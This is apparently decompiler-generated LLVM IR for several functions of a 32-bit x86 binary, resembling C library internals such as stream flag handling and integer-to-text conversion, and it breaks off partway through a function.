define i32 @function_8050134(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050134:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8050134 = load i32, i32* @ebx, align 4
  %v4_8050138 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8050138, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8050140 = load i16, i16* %arg1, align 2
  %v3_8050140 = zext i16 %v2_8050140 to i32
  store i32 %v3_8050140, i32* %eax.global-to-local, align 4
  %v2_8050143 = and i32 %v3_8050140, %arg2
  %v3_8050143 = icmp eq i32 %v2_8050143, 0
  %v1_8050145 = icmp eq i1 %v3_8050143, false
  br i1 %v1_8050145, label %dec_label_pc_8050153, label %dec_label_pc_8050147

dec_label_pc_8050147:                             ; preds = %dec_label_pc_8050134
  %v1_8050147 = and i32 %v3_8050140, 2176
  %v2_8050147 = icmp eq i32 %v1_8050147, 0
  %v1_805014c = icmp eq i1 %v2_8050147, false
  br i1 %v1_805014c, label %dec_label_pc_805015b, label %dec_label_pc_805014e

dec_label_pc_805014e:                             ; preds = %dec_label_pc_8050147
  %v2_805014e = or i32 %v3_8050140, %arg2
  store i32 %v2_805014e, i32* %eax.global-to-local, align 4
  %v1_8050150 = trunc i32 %v2_805014e to i16
  store i16 %v1_8050150, i16* %arg1, align 2
  %v0_8050153.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050153

dec_label_pc_8050153:                             ; preds = %dec_label_pc_8050134, %dec_label_pc_805014e
  %v0_805019c = phi i32 [ %v4_8050138, %dec_label_pc_8050134 ], [ %v0_8050153.pre, %dec_label_pc_805014e ]
  %v1_8050153 = inttoptr i32 %v0_805019c to i16*
  %v2_8050153 = load i16, i16* %v1_8050153, align 2
  %v3_8050153 = zext i16 %v2_8050153 to i32
  store i32 %v3_8050153, i32* %edx.global-to-local, align 4
  %v2_8050156 = and i16 %v2_8050153, 32
  %v3_8050156 = icmp eq i16 %v2_8050156, 0
  br i1 %v3_8050156, label %dec_label_pc_8050173, label %dec_label_pc_805015b

dec_label_pc_805015b:                             ; preds = %dec_label_pc_8050153, %dec_label_pc_8050147
  %v1_805015b = call i32 @function_804baa4(i32 %v0_8050134)
  store i32 %v1_805015b, i32* %eax.global-to-local, align 4
  %v1_8050160 = inttoptr i32 %v1_805015b to i32*
  store i32 9, i32* %v1_8050160, align 4
  br label %dec_label_pc_8050166

dec_label_pc_8050166:                             ; preds = %dec_label_pc_805018a, %dec_label_pc_805015b
  %v0_8050166 = load i32, i32* @ebx, align 4
  %v1_8050166 = inttoptr i32 %v0_8050166 to i32*
  %v2_8050166 = load i32, i32* %v1_8050166, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_805016b = or i32 %v2_8050166, 8
  store i32 %v1_805016b, i32* %eax.global-to-local, align 4
  %v1_805016e = trunc i32 %v1_805016b to i16
  %v3_805016e = inttoptr i32 %v0_8050166 to i16*
  store i16 %v1_805016e, i16* %v3_805016e, align 2
  br label %dec_label_pc_80501d5

dec_label_pc_8050173:                             ; preds = %dec_label_pc_8050153
  %v2_8050173 = urem i16 %v2_8050153, 4
  %v3_8050173 = icmp eq i16 %v2_8050173, 0
  br i1 %v3_8050173, label %dec_label_pc_80501bd, label %dec_label_pc_8050178

dec_label_pc_8050178:                             ; preds = %dec_label_pc_8050173
  %v2_8050178 = and i32 %v3_8050153, 4
  %v3_8050178 = icmp eq i32 %v2_8050178, 0
  %v1_805017b = icmp eq i1 %v3_8050178, false
  br i1 %v1_805017b, label %dec_label_pc_80501a9, label %dec_label_pc_805017d

dec_label_pc_805017d:                             ; preds = %dec_label_pc_8050178
  %v1_805017d = add i32 %v0_805019c, 20
  %v2_805017d = inttoptr i32 %v1_805017d to i32*
  %v3_805017d = load i32, i32* %v2_805017d, align 4
  store i32 %v3_805017d, i32* %eax.global-to-local, align 4
  %v2_8050180 = add i32 %v0_805019c, 16
  %v3_8050180 = inttoptr i32 %v2_8050180 to i32*
  %v4_8050180 = load i32, i32* %v3_8050180, align 4
  %v15_8050180 = icmp eq i32 %v3_805017d, %v4_8050180
  %v1_8050183 = icmp eq i1 %v15_8050180, false
  br i1 %v1_8050183, label %dec_label_pc_805018a, label %dec_label_pc_8050185

dec_label_pc_8050185:                             ; preds = %dec_label_pc_805017d
  %v2_8050185 = and i32 %v3_8050153, 2
  %v3_8050185 = icmp eq i32 %v2_8050185, 0
  br i1 %v3_8050185, label %dec_label_pc_80501a9, label %dec_label_pc_805018a

dec_label_pc_805018a:                             ; preds = %dec_label_pc_8050185, %dec_label_pc_805017d
  %v1_805018a = and i32 %v3_8050153, 1024
  store i32 %v1_805018a, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_805018a, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_805019d = call i32 @function_8051714(i32 %v0_805019c, i32 0, i32 %tmp17, i32 %v1_805018a)
  store i32 %v5_805019d, i32* %eax.global-to-local, align 4
  %v1_80501a5 = icmp eq i32 %v5_805019d, 0
  %v1_80501a7 = icmp eq i1 %v1_80501a5, false
  br i1 %v1_80501a7, label %dec_label_pc_8050166, label %dec_label_pc_805018a.dec_label_pc_80501a9_crit_edge

dec_label_pc_805018a.dec_label_pc_80501a9_crit_edge: ; preds = %dec_label_pc_805018a
  %v0_80501a9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80501a9

dec_label_pc_80501a9:                             ; preds = %dec_label_pc_805018a.dec_label_pc_80501a9_crit_edge, %dec_label_pc_8050185, %dec_label_pc_8050178
  %v2_80501ae = phi i32 [ %v0_80501a9.pre, %dec_label_pc_805018a.dec_label_pc_80501a9_crit_edge ], [ %v0_805019c, %dec_label_pc_8050185 ], [ %v0_805019c, %dec_label_pc_8050178 ]
  %v1_80501a9 = inttoptr i32 %v2_80501ae to i32*
  %v2_80501a9 = load i32, i32* %v1_80501a9, align 4
  %v1_80501ab = and i32 %v2_80501a9, -4
  store i32 %v1_80501ab, i32* %eax.global-to-local, align 4
  %v1_80501ae = trunc i32 %v1_80501ab to i16
  %v3_80501ae = inttoptr i32 %v2_80501ae to i16*
  store i16 %v1_80501ae, i16* %v3_80501ae, align 2
  %v0_80501b1 = load i32, i32* @ebx, align 4
  %v1_80501b1 = add i32 %v0_80501b1, 8
  %v2_80501b1 = inttoptr i32 %v1_80501b1 to i32*
  %v3_80501b1 = load i32, i32* %v2_80501b1, align 4
  store i32 %v3_80501b1, i32* %eax.global-to-local, align 4
  %v2_80501b4 = add i32 %v0_80501b1, 24
  %v3_80501b4 = inttoptr i32 %v2_80501b4 to i32*
  store i32 %v3_80501b1, i32* %v3_80501b4, align 4
  %v0_80501b7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80501b7 = load i32, i32* @ebx, align 4
  %v2_80501b7 = add i32 %v1_80501b7, 16
  %v3_80501b7 = inttoptr i32 %v2_80501b7 to i32*
  store i32 %v0_80501b7, i32* %v3_80501b7, align 4
  %v0_80501ba = load i32, i32* %eax.global-to-local, align 4
  %v1_80501ba = load i32, i32* @ebx, align 4
  %v2_80501ba = add i32 %v1_80501ba, 20
  %v3_80501ba = inttoptr i32 %v2_80501ba to i32*
  store i32 %v0_80501ba, i32* %v3_80501ba, align 4
  %v0_80501bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80501bd

dec_label_pc_80501bd:                             ; preds = %dec_label_pc_8050173, %dec_label_pc_80501a9
  %v2_80501c4 = phi i32 [ %v0_805019c, %dec_label_pc_8050173 ], [ %v0_80501bd.pre, %dec_label_pc_80501a9 ]
  %v1_80501bd = inttoptr i32 %v2_80501c4 to i32*
  %v2_80501bd = load i32, i32* %v1_80501bd, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80501c1 = or i32 %v2_80501bd, 64
  store i32 %v1_80501c1, i32* %eax.global-to-local, align 4
  %v1_80501c4 = trunc i32 %v1_80501c1 to i16
  %v3_80501c4 = inttoptr i32 %v2_80501c4 to i16*
  store i16 %v1_80501c4, i16* %v3_80501c4, align 2
  %v0_80501c7 = load i32, i32* %eax.global-to-local, align 4
  %v1_80501c7 = urem i32 %v0_80501c7, 65536
  store i32 %v1_80501c7, i32* %eax.global-to-local, align 4
  %v3_80501ca = and i32 %v0_80501c7, 2816
  %v4_80501ca = icmp eq i32 %v3_80501ca, 0
  %v1_80501cd = icmp eq i1 %v4_80501ca, false
  br i1 %v1_80501cd, label %dec_label_pc_80501d5, label %dec_label_pc_80501cf

dec_label_pc_80501cf:                             ; preds = %dec_label_pc_80501bd
  %v0_80501cf = load i32, i32* @ebx, align 4
  %v1_80501cf = add i32 %v0_80501cf, 12
  %v2_80501cf = inttoptr i32 %v1_80501cf to i32*
  %v3_80501cf = load i32, i32* %v2_80501cf, align 4
  store i32 %v3_80501cf, i32* %eax.global-to-local, align 4
  %v2_80501d2 = add i32 %v0_80501cf, 28
  %v3_80501d2 = inttoptr i32 %v2_80501d2 to i32*
  store i32 %v3_80501cf, i32* %v3_80501d2, align 4
  br label %dec_label_pc_80501d5

dec_label_pc_80501d5:                             ; preds = %dec_label_pc_80501bd, %dec_label_pc_8050166, %dec_label_pc_80501cf
  %v0_80501d5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80501d5, i32* %eax.global-to-local, align 4
  %v2_80501d7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80501d7, i32* %edx.global-to-local, align 4
  store i32 %v0_8050134, i32* @ebx, align 4
  ret i32 %v0_80501d5

; uselistorder directives
  uselistorder i32 %v0_80501c7, { 1, 0 }
  uselistorder i32 %v1_805018a, { 1, 0, 2 }
  uselistorder i32 %v0_805019c, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8050140, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050134, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32 1024, { 0, 11, 3, 6, 5, 12, 4, 1, 2, 7, 9, 10, 8 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80501d5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80501bd, { 1, 0 }
  uselistorder label %dec_label_pc_8050153, { 1, 0 }
}

define i32 @function_80501dc() local_unnamed_addr {
dec_label_pc_80501dc:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v5_80501dc = icmp slt i32 %tmp4, 0
  %v3_805020d = and i32 %tmp3, 2048
  %v4_805020d = icmp eq i32 %v3_805020d, 0
  br i1 %v5_80501dc, label %dec_label_pc_805020d, label %dec_label_pc_80501eb

dec_label_pc_80501eb:                             ; preds = %dec_label_pc_80501dc
  %v1_80501ee = icmp eq i1 %v4_805020d, false
  br i1 %v1_80501ee, label %dec_label_pc_8050212, label %dec_label_pc_80501f0

dec_label_pc_80501f0:                             ; preds = %dec_label_pc_80501eb
  %v6_80501f0 = icmp eq i32 %tmp3, 256
  %v1_80501f6 = inttoptr i32 %tmp to i32*
  %v2_80501f6 = load i32, i32* %v1_80501f6, align 4
  %v1_80501f8 = icmp eq i1 %v6_80501f0, false
  br i1 %v1_80501f8, label %dec_label_pc_80501ff, label %dec_label_pc_80501fa

dec_label_pc_80501fa:                             ; preds = %dec_label_pc_80501f0
  %v1_80501fa = urem i32 %v2_80501f6, 256
  br label %dec_label_pc_805020a

dec_label_pc_80501ff:                             ; preds = %dec_label_pc_80501f0
  %v6_80501ff = icmp eq i32 %tmp3, 512
  %v1_8050205 = icmp eq i1 %v6_80501ff, false
  br i1 %v1_8050205, label %dec_label_pc_805020a, label %dec_label_pc_8050207

dec_label_pc_8050207:                             ; preds = %dec_label_pc_80501ff
  %v1_8050207 = urem i32 %v2_80501f6, 65536
  br label %dec_label_pc_805020a

dec_label_pc_805020a:                             ; preds = %dec_label_pc_80501ff, %dec_label_pc_80501fa, %dec_label_pc_8050207
  %v0_805020c = phi i32 [ %v2_80501f6, %dec_label_pc_80501ff ], [ %v1_80501fa, %dec_label_pc_80501fa ], [ %v1_8050207, %dec_label_pc_8050207 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_805020c

dec_label_pc_805020d:                             ; preds = %dec_label_pc_80501dc
  br i1 %v4_805020d, label %dec_label_pc_8050218, label %dec_label_pc_8050212

dec_label_pc_8050212:                             ; preds = %dec_label_pc_805020d, %dec_label_pc_80501eb
  %v1_8050212 = add i32 %tmp, 4
  %v2_8050212 = inttoptr i32 %v1_8050212 to i32*
  %v3_8050212 = load i32, i32* %v2_8050212, align 4
  store i32 %v3_8050212, i32* @edx, align 4
  %v1_8050215 = inttoptr i32 %tmp to i32*
  %v2_8050215 = load i32, i32* %v1_8050215, align 4
  ret i32 %v2_8050215

dec_label_pc_8050218:                             ; preds = %dec_label_pc_805020d
  %v6_8050218 = icmp eq i32 %tmp3, 256
  %v1_805021e = inttoptr i32 %tmp to i32*
  %v2_805021e = load i32, i32* %v1_805021e, align 4
  %v1_8050220 = icmp eq i1 %v6_8050218, false
  br i1 %v1_8050220, label %dec_label_pc_8050227, label %dec_label_pc_8050222

dec_label_pc_8050222:                             ; preds = %dec_label_pc_8050218
  %v1_8050222 = mul i32 %v2_805021e, 16777216
  %v2_8050222 = sdiv i32 %v1_8050222, 16777216
  br label %dec_label_pc_8050230

dec_label_pc_8050227:                             ; preds = %dec_label_pc_8050218
  %v6_8050227 = icmp eq i32 %tmp3, 512
  %v1_805022d = icmp eq i1 %v6_8050227, false
  br i1 %v1_805022d, label %dec_label_pc_8050230, label %dec_label_pc_805022f

dec_label_pc_805022f:                             ; preds = %dec_label_pc_8050227
  %v1_805022f = mul i32 %v2_805021e, 65536
  %v2_805022f = sdiv i32 %v1_805022f, 65536
  br label %dec_label_pc_8050230

dec_label_pc_8050230:                             ; preds = %dec_label_pc_8050227, %dec_label_pc_8050222, %dec_label_pc_805022f
  %v0_8050230 = phi i32 [ %v2_805021e, %dec_label_pc_8050227 ], [ %v2_8050222, %dec_label_pc_8050222 ], [ %v2_805022f, %dec_label_pc_805022f ]
  %v1_8050230 = ashr i32 %v0_8050230, 31
  store i32 %v1_8050230, i32* @edx, align 4
  ret i32 %v0_8050230

; uselistorder directives
  uselistorder i32 %v0_8050230, { 1, 0 }
  uselistorder i32 %v2_805021e, { 2, 0, 1 }
  uselistorder i32 %v2_80501f6, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8050230, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805020a, { 2, 0, 1 }
}

define i32 @function_8050234() local_unnamed_addr {
dec_label_pc_8050234:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_4()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8050234 = load i32, i32* @ebx, align 4
  store i32 %v0_8050234, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8050239 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8050239, i32* %ebx.global-to-local, align 4
  %v4_805023d = trunc i32 %tmp4 to i16
  %v6_8050245 = icmp eq i32 %tmp6, 256
  %v1_805024b = icmp eq i1 %v6_8050245, false
  br i1 %v1_805024b, label %dec_label_pc_8050251, label %dec_label_pc_805024d

dec_label_pc_805024d:                             ; preds = %dec_label_pc_8050234
  %v2_805024d = trunc i32 %tmp4 to i8
  %v4_805024d = bitcast i16* %tmp5 to i8*
  store i8 %v2_805024d, i8* %v4_805024d, align 1
  br label %dec_label_pc_805026f

dec_label_pc_8050251:                             ; preds = %dec_label_pc_8050234
  %v6_8050251 = icmp eq i32 %tmp6, 2048
  %v1_8050257 = icmp eq i1 %v6_8050251, false
  br i1 %v1_8050257, label %dec_label_pc_8050260, label %dec_label_pc_8050259

dec_label_pc_8050259:                             ; preds = %dec_label_pc_8050251
  %sext2 = mul i32 %tmp4, 65536
  %v1_8050259 = sdiv i32 %sext2, 65536
  %v3_8050259 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8050259, i32* %v3_8050259, align 4
  %v0_805025b = load i32, i32* %edx.global-to-local, align 4
  %v1_805025b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805025b = add i32 %v1_805025b, 4
  %v3_805025b = inttoptr i32 %v2_805025b to i32*
  store i32 %v0_805025b, i32* %v3_805025b, align 4
  br label %dec_label_pc_805026f

dec_label_pc_8050260:                             ; preds = %dec_label_pc_8050251
  %v6_8050260 = icmp eq i32 %tmp6, 512
  %v1_8050266 = icmp eq i1 %v6_8050260, false
  br i1 %v1_8050266, label %dec_label_pc_805026d, label %dec_label_pc_8050268

dec_label_pc_8050268:                             ; preds = %dec_label_pc_8050260
  store i16 %v4_805023d, i16* %tmp5, align 2
  br label %dec_label_pc_805026f

dec_label_pc_805026d:                             ; preds = %dec_label_pc_8050260
  %sext3 = mul i32 %tmp4, 65536
  %v1_805026d = sdiv i32 %sext3, 65536
  %v3_805026d = bitcast i16* %tmp5 to i32*
  store i32 %v1_805026d, i32* %v3_805026d, align 4
  br label %dec_label_pc_805026f

dec_label_pc_805026f:                             ; preds = %dec_label_pc_8050268, %dec_label_pc_8050259, %dec_label_pc_805024d, %dec_label_pc_805026d
  %v2_805026f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805026f, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8050270 = sdiv i32 %sext, 65536
  ret i32 %v1_8050270

; uselistorder directives
  uselistorder label %dec_label_pc_805026f, { 3, 0, 1, 2 }
}

define i32 @function_8050274(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8050274:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_805027f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805027f, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_805028b = icmp slt i32 %arg4, 0
  %v1_805028d = icmp eq i1 %v2_805028b, false
  br i1 %v1_805028d, label %dec_label_pc_80502ae, label %dec_label_pc_805028f

dec_label_pc_805028f:                             ; preds = %dec_label_pc_8050274
  %v1_805028f = sub i32 0, %arg4
  store i32 %v1_805028f, i32* %esi.global-to-local, align 4
  %v2_8050291 = icmp slt i32 %arg3, 0
  %v1_8050293 = icmp eq i1 %v2_8050291, false
  br i1 %v1_8050293, label %dec_label_pc_80502ae, label %dec_label_pc_8050295

dec_label_pc_8050295:                             ; preds = %dec_label_pc_805028f
  %v1_8050295 = sub i32 0, %arg2
  %v5_8050295 = icmp ne i32 %arg2, 0
  store i32 %v1_8050295, i32* %ecx.global-to-local, align 4
  %v2_8050297 = zext i1 %v5_8050295 to i32
  %v3_8050297 = add i32 %v2_8050297, %arg3
  %v1_805029a = sub i32 0, %v3_8050297
  store i32 %v1_805029a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80502ae

dec_label_pc_80502ae:                             ; preds = %dec_label_pc_8050274, %dec_label_pc_805028f, %dec_label_pc_8050295
  %v0_80502b3 = phi i32 [ %v1_805028f, %dec_label_pc_8050295 ], [ %v1_805028f, %dec_label_pc_805028f ], [ %arg4, %dec_label_pc_8050274 ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_8050295 ], [ 0, %dec_label_pc_805028f ], [ 0, %dec_label_pc_8050274 ]
  %div = udiv i32 -1, %v0_80502b3
  %tmp30 = urem i32 -1, %v0_80502b3
  store i8 0, i8* %arg1, align 1
  %v1_80502b8 = add i32 %tmp30, 1
  %v1_80502b9 = load i32, i32* %esi.global-to-local, align 4
  %v12_80502b9 = icmp eq i32 %v1_80502b8, %v1_80502b9
  %v1_80502c3 = icmp eq i1 %v12_80502b9, false
  br i1 %v1_80502c3, label %dec_label_pc_80502d2, label %dec_label_pc_80502c5

dec_label_pc_80502c5:                             ; preds = %dec_label_pc_80502ae
  %v1_80502c5 = add i32 %div, 1
  br label %dec_label_pc_80502d2

dec_label_pc_80502d2:                             ; preds = %dec_label_pc_80502ae, %dec_label_pc_80502c5
  %stack_var_-20.0.off0 = phi i32 [ %v1_80502b8, %dec_label_pc_80502ae ], [ 0, %dec_label_pc_80502c5 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_80502ae ], [ %v1_80502c5, %dec_label_pc_80502c5 ]
  %v0_80502d2 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80502d2, i32* %ebp.global-to-local, align 4
  %v0_80502d4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80502d4, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80502d8

dec_label_pc_80502d8:                             ; preds = %dec_label_pc_8050326, %dec_label_pc_80502d2
  %v0_805030f = phi i32 [ %v0_8050328, %dec_label_pc_8050326 ], [ %v0_80502d2, %dec_label_pc_80502d2 ]
  %v0_80502dc = phi i32 [ %v1_805032a, %dec_label_pc_8050326 ], [ %v0_80502d4, %dec_label_pc_80502d2 ]
  %v1_80502d8 = icmp eq i32 %v0_80502dc, 0
  br i1 %v1_80502d8, label %dec_label_pc_805030f, label %dec_label_pc_80502dc

dec_label_pc_80502dc:                             ; preds = %dec_label_pc_80502d8
  %v0_80502e0 = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_80502dc, %v0_80502e0
  %tmp31 = urem i32 %v0_80502dc, %v0_80502e0
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_805030f, %v0_80502e0
  %tmp32 = urem i32 %v0_805030f, %v0_80502e0
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_80502f3 = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_80502f7 = add i32 %tmp32, %v6_80502f3
  %v8_80502fd = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_8050302 = add i32 %div7, %v8_80502fd
  store i32 %v2_8050302, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_80502f7, %v0_80502e0
  %tmp33 = urem i32 %v2_80502f7, %v0_80502e0
  %v2_805030a = add i32 %div8, %v2_8050302
  br label %dec_label_pc_8050317

dec_label_pc_805030f:                             ; preds = %dec_label_pc_80502d8
  %v0_8050313 = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_805030f, %v0_8050313
  %tmp34 = urem i32 %v0_805030f, %v0_8050313
  br label %dec_label_pc_8050317

dec_label_pc_8050317:                             ; preds = %dec_label_pc_80502dc, %dec_label_pc_805030f
  %v13_805031d = phi i32 [ %tmp33, %dec_label_pc_80502dc ], [ %tmp34, %dec_label_pc_805030f ]
  %storemerge = phi i32 [ %v2_805030a, %dec_label_pc_80502dc ], [ %div10, %dec_label_pc_805030f ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8050317 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050317 = add i32 %v0_8050317, -1
  store i32 %v1_8050317, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_805031d, 10
  br i1 %tmp, label %dec_label_pc_805031d, label %dec_label_pc_8050322

dec_label_pc_805031d:                             ; preds = %dec_label_pc_8050317
  %v2_805031d = add i32 %v13_805031d, 48
  %v12_805031d = and i32 %v2_805031d, 255
  %v14_805031d = and i32 %v13_805031d, -256
  %v15_805031d = or i32 %v12_805031d, %v14_805031d
  br label %dec_label_pc_8050326

dec_label_pc_8050322:                             ; preds = %dec_label_pc_8050317
  %v6_8050322 = add i32 %v13_805031d, %arg5
  %v21_8050322 = and i32 %v6_8050322, 255
  %v23_8050322 = and i32 %v13_805031d, -256
  %v24_8050322 = or i32 %v21_8050322, %v23_8050322
  br label %dec_label_pc_8050326

dec_label_pc_8050326:                             ; preds = %dec_label_pc_805031d, %dec_label_pc_8050322
  %storemerge9 = phi i32 [ %v15_805031d, %dec_label_pc_805031d ], [ %v24_8050322, %dec_label_pc_8050322 ]
  %v1_8050326 = trunc i32 %storemerge9 to i8
  %v3_8050326 = inttoptr i32 %v1_8050317 to i8*
  store i8 %v1_8050326, i8* %v3_8050326, align 1
  %v0_8050328 = load i32, i32* %ebp.global-to-local, align 4
  %v1_805032a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805032a = or i32 %v1_805032a, %v0_8050328
  %v3_805032a = icmp eq i32 %v2_805032a, 0
  %v1_805032c = icmp eq i1 %v3_805032a, false
  br i1 %v1_805032c, label %dec_label_pc_80502d8, label %dec_label_pc_805032e

dec_label_pc_805032e:                             ; preds = %dec_label_pc_8050326
  %v4_805032e = icmp eq i32 %storemerge11, 0
  br i1 %v4_805032e, label %dec_label_pc_8050339, label %dec_label_pc_8050335

dec_label_pc_8050335:                             ; preds = %dec_label_pc_805032e
  %v0_8050335 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050335 = add i32 %v0_8050335, -1
  store i32 %v1_8050335, i32* %edi.global-to-local, align 4
  %v1_8050336 = inttoptr i32 %v1_8050335 to i8*
  store i8 45, i8* %v1_8050336, align 1
  br label %dec_label_pc_8050339

dec_label_pc_8050339:                             ; preds = %dec_label_pc_805032e, %dec_label_pc_8050335
  %v0_805033c = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_805033c

; uselistorder directives
  uselistorder i32 %v13_805031d, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_80502f7, { 1, 0 }
  uselistorder i32 %v0_80502e0, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_80502dc, { 1, 0, 2 }
  uselistorder i32 %v0_805030f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80502b8, { 1, 0 }
  uselistorder i32 %v0_80502b3, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050339, { 1, 0 }
  uselistorder label %dec_label_pc_8050326, { 1, 0 }
  uselistorder label %dec_label_pc_8050317, { 1, 0 }
  uselistorder label %dec_label_pc_80502d2, { 1, 0 }
  uselistorder label %dec_label_pc_80502ae, { 2, 1, 0 }
}

define i32 @function_8050344() local_unnamed_addr {
dec_label_pc_8050344:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp145 = call i16 @__decompiler_undefined_function_3()
  %tmp154 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050345 = load i32, i32* @edi, align 4
  %v0_8050346 = load i32, i32* @esi, align 4
  %v0_8050347 = load i32, i32* @ebx, align 4
  store i32 %v0_8050347, i32* %stack_var_-16, align 4
  store i32 %tmp155, i32* %eax.global-to-local, align 4
  store i32 %tmp155, i32* %edx.global-to-local, align 4
  %v4_805035c = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_805035c = add i3 %v4_805035c, -1
  store x86_fp80 %tmp154, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_805035c, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8050363 = add i32 %tmp155, 4
  %v2_8050363 = inttoptr i32 %v1_8050363 to i32*
  %v3_8050363 = load i32, i32* %v2_8050363, align 4
  store i32 %v3_8050363, i32* %eax.global-to-local, align 4
  %v1_805036a = add i32 %tmp155, 8
  %v2_805036a = inttoptr i32 %v1_805036a to i8*
  %v3_805036a = load i8, i8* %v2_805036a, align 1
  %v4_805036a = zext i8 %v3_805036a to i32
  %v6_805036a = and i32 %v0_8050347, -256
  %v7_805036a = or i32 %v4_805036a, %v6_805036a
  store i32 %v7_805036a, i32* %ebx.global-to-local, align 4
  %v1_805036d = inttoptr i32 %tmp155 to i32*
  %v2_805036d = load i32, i32* %v1_805036d, align 4
  store i32 %v2_805036d, i32* %ebp.global-to-local, align 4
  %v2_8050379 = or i8 %v3_805036a, 32
  %v7_8050379 = zext i8 %v2_8050379 to i32
